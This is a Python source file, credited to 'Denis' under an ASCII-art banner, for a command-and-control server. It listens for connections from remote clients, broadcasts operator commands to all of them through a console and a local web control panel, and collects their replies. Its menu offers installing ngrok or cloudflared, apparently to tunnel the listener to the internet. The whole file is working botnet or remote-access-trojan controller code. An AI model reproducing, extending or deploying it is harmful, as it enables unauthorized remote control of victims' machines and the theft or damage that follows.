import socket
import subprocess
import threading
import colorama
from colorama import *
import os
import http.server
import socketserver
import argparse

colorama.init()
clients = []
responses = []

def banner():
   print(Fore.YELLOW +"""
────░░░───────────────────────────░░░───
─░░░─────────░▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▓▓─────░───
░░──────▒█████████████▓▓▓▓▓▒▓▓██▓────░──
░────▒███▓▒▒░──░▒▒░──░░░░░░░────██────░─
░───██░───░░▒░░░░───░─░░▒▒▓▓▒░───██───░░
───▓█───▒░───▒░────▒───────▒▒▒░──░█────░
───█▒─────────░──────▓████▒───────██────
──██────██████─────██▓▓█████▓─░────██───
─██▒░───▓███████──░████▓█▓▒█▒─▓▓▓█▒─██▓─
▓█─░▓██▓──────█─────▒───▒█▓░▒███▓░██──█▒
██──▒░▒███▒──██───────────▒▒▒──▒█──██─░█
░█─░──█────██▓─────▓██▒─────▒██▒██▒▓█──█
─██░─██░───██▓───██▓░█──▒████───█░─█░─██
──█──████▓───▒██───░████▓░─██▒███────██─
──█▓─█▓█░███████████▒░█──▒███▒██────██──
──█▓─███░█▓──█▒─░█───▒███████▓█────██───
──██─███████████████████───░██────▓█────
──██─██████████████▒───█──██▓────░█░───░
──█▓─░██▓█─█─▒█───█────████─────██▒───░░
──█▒──▒██████▒█▒▒███████▒──░▒▓███─────░─
──█░──────▒▒██████▒▒░░──░▒░▓███▒──────░─
──█──▒─▒▒──────────░▒▒░──▓██░────░░────░
──█──░▒▒▒▒▒░░─░─░─░───░███████▒───░────░
──██─────────────░▒▒▓███████████──░░───░
───██▓░──────▒▓████▓░──█████████▒──░────
──░──█████████████───▒▓██████████──░░───
──░──██████████████▒▓████████████░──░───
──░──▓███████████▓───░███████████▓──░───
──░───███████████─────████████████──░───
───░───██████████░▒███████████████──░───
───░░───▓███████████████████▒─▓██───░───
───░▒───█████████████████████──────░░───
──░░───██████████████████████───░░░─────
─░░───████████████████████████──░▒─────░
─░───█████████████████████████───▒─────░
░───██████████████████████████▓───░░────
░──▓███████████████████████████░───░░───
──░█████████████████████████████▓───░░──
░──▓██████████████████████████████────░─
░────▓█████████████████████████████░───░
▒────███████████████████████████████▒──░
───▒█████████████████████████████████───
──▒███████████████████████████████████──
─░████████████████████████████████████──
─█████████████░─────────░█████████████░─
─███████████░─────────────████████████──
─▓██████████───░░░░░░▒▒───▒███████████──
──██████████──░░────░░───░███████████▒──
──██████████──░─────░───█████████████───
───█████████──░░───░───█████████████───░
░──█████████───░───░───███████████▒───░░
░──▒████████░──░───░──██████████▒────░░─
░───████████▓──░───░──███▓████▒────░░───
░░──████████───░───░───██░─▓─────░░░────
─░──▒███▒─█▓──░░───░░───▒███───░░───────
─░░───░█░─▓█──░░────░░───███──░░──────░░
──░────█▓███──░──────░░───░───░────░░░──
──░░──█▒─██───░────────░─────░░───░░────
──░──░████───░░─────────░░░░░─────░─────
──░░──▒░────░░────▒░─────────────░──────
            (Made By Denis!)
""" +RESET_ALL)
 



def options():
   print(Fore.GREEN +"""
--------------------------------------
|              Commands              |
|------------------------------------|
|ingrok -install ngrok               |
|icloudflared -install cloudflared   |
|arch -checking if its 32bit or 64bit|
|____________________________________|
site: http://localhost:6660
         """ +RESET_ALL)



def receive_response(client, address):
    while True:
        try:
            response = client.recv(1024).decode('utf-8')
            if response:
                print(colorama.Fore.GREEN + f'Response from {address}: {response}')
                responses.append(response)
            else:
                break
        except:
            print(colorama.Fore.RED + f'Error receiving response from {address}')
            clients.remove(client)
            break

class ControlPanelRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('control_panel.html', 'r') as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        global responses
        content_length = int(self.headers['Content-Length'])
        command = self.rfile.read(content_length).decode('utf-8').split("=")[1]
        responses = []
        for client in clients:
            try:
                client.send(command.encode('utf-8'))
            except BrokenPipeError:
                clients.remove(client)
        while len(responses) < len(clients):
            continue
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(('\n'.join(responses) if responses else 'No response received').encode())

def control_panel(host, port):
    handler = ControlPanelRequestHandler
    with socketserver.TCPServer((host, port), handler) as httpd:
        httpd.serve_forever()

def main(host, port):
    server = socket.socket()
    server.bind((host, port))
    server.listen(5)

    print(colorama.Fore.YELLOW + f'Listening on {host}:{port}')
    addresses = []

    def input_thread():
        while True:
            command = input(colorama.Fore.YELLOW + 'Enter a command: ')
            for client in clients:
                try:
                    client.send(command.encode('utf-8'))
                except BrokenPipeError:
                    clients.remove(client)
    receive_input_thread = threading.Thread(target=input_thread)
    receive_input_thread.start()
    control_thread = threading.Thread(target=control_panel, args=('localhost', 6660))
    control_thread.start()

    while True:
        client, address = server.accept()
        print(colorama.Fore.CYAN + f'Accepted connection from {address}')
        clients.append(client)
        addresses.append(address)
        receive_thread = threading.Thread(target=receive_response, args=(client, address))
        receive_thread.start()

if __name__ == '__main__':
    host = '0.0.0.0'
    port = int(input('Enter a port: '))
    banner()
    options()
    main(host, port)
